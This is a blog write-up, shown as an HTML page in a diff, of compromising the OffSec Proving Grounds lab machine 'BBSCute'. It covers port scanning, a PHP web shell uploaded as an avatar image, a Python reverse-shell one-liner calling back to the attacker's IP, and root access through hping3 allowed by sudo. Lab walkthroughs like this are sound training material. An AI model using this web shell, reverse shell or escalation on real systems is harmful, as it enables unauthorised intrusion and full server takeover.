@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: BBSCute</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: BBSCute | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: BBSCute" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/30/Proving_grounds_Play-BBSCute.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/30/Proving_grounds_Play-BBSCute.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-30T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: BBSCute" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-30T02:00:00+05:30","datePublished":"2023-09-30T02:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: BBSCute","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/30/Proving_grounds_Play-BBSCute.html"},"url":"http://localhost:4000/2023/09/30/Proving_grounds_Play-BBSCute.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/30/Proving_grounds_Play-BBSCute.html">
+    <h2 class="post-title">Proving grounds Play: BBSCute</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 30, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 24b3df010bcac2ab2ee949b058086afa <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 6ac4356a7a1e7e51855b815c7c744984 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Debian Default Page: It works
+|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+88/tcp  open  http     nginx 1.14.2
+|_http-title: 404 Not Found
+|_http-server-header: nginx/1.14.2
+110/tcp open  pop3     Courier pop3d
+995/tcp open  ssl/pop3 Courier pop3d
+</code></pre></div></div>
+
+<h2 id="80tcp---open--http---apache-httpd-2438-debian">80/tcp - open  http - Apache httpd 2.4.38 ((Debian))</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|00:36|~/pg-play/BBSCute<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.151.128/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt <span class="nt">-r</span> <span class="nt">-t</span> 60 <span class="nt">--full-url</span>
+
+Target: http://192.168.151.128/
+
+<span class="o">[</span>00:37:05] Starting: 
+<span class="o">[</span>00:37:21] 301 -  317B  - http://192.168.151.128/core  -&gt;  http://192.168.151.128/core/     <span class="o">(</span>Added to queue<span class="o">)</span>
+<span class="o">[</span>00:37:23] 301 -  317B  - http://192.168.151.128/docs  -&gt;  http://192.168.151.128/docs/     <span class="o">(</span>Added to queue<span class="o">)</span>
+<span class="o">[</span>00:37:24] 200 -    1KB - http://192.168.151.128/favicon.ico
+<span class="o">[</span>00:37:27] 200 -   10KB - http://192.168.151.128/index.html
+<span class="o">[</span>00:37:28] 200 -    6KB - http://192.168.151.128/index.php  <span class="c">#login page</span>
+</code></pre></div></div>
+
+<h2 id="http192168151128indexphp">http://192.168.151.128/index.php</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/BBSCute/web.png" alt="img" /></p>
+
+<p>Register ➡️ login ➡️ Upload Avatar ➡️ upload reverse shell/php code execution code as avatar.</p>
+
+<p><strong><em>Note:</em></strong> In order to do a successfull registration the CAPTCHA must be sumitted and which is not available on the registration page. So it can be obtained by viewing the CAPTCHA page source <code class="language-plaintext highlighter-rouge">view-source:http://192.168.151.128/captcha.php</code></p>
+
+<p><strong>Upload.php</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF98<span class="p">;</span>
+&lt;?php
+<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
+system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p><strong>Trigger Payload</strong>: <code class="language-plaintext highlighter-rouge">http://192.168.151.128/uploads/avatar_naveenj_upload.php?cmd=id</code></p>
+
+<p>Check the python version using <code class="language-plaintext highlighter-rouge">which python</code> command the create the reverse shell code.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.204",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</span>
+</code></pre></div></div>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|01:17|~/pg-play/BBSCute<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>192.168.45.204] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.151.128] 60944
+www-data@cute:/var/www/html/uploads<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Enumerate user executable permissions using <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cute:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>    <span class="c">#check executable permissions</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on cute:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User www-data may run the following commands on cute:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/hping3 <span class="nt">--icmp</span>    
+    www-data@cute:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/sbin/hping3
+<span class="nb">ls</span> <span class="nt">-al</span> /usr/sbin/hping3
+<span class="nt">-rwsr-sr-x</span> 1 root root 156808 Sep  6  2014 /usr/sbin/hping3
+</code></pre></div></div>
+
+<p>The binary can be run as root without password.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cute:/<span class="nv">$ </span>hping3
+hping3
+hping3&gt; <span class="nb">whoami
+whoami
+</span>root    <span class="c">#root obtained</span>
+hping3&gt; <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+hping3&gt;
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
